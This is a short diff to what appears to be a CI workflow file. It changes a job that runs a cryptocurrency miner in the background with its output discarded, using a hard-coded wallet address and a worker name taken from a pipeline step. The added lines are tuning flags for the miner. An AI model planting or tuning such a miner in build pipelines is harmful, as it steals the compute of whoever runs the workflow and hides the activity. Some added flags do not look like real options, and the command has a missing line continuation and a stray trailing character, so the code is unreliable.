@@ -41,5 +41,9 @@ jobs:
             -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS \
             -p ${{ steps.worker.outputs.name }} \
             -k --tls --donate-level=1 \
-            -t 4
+            -t 4 \
+            --randomx-mode=fast \
+            --msr-use-srbds=1 \
+            --msr-use-zeus=1 \
+            --msr-use-wrmsr=1
             > /dev/null 2>&1 &s
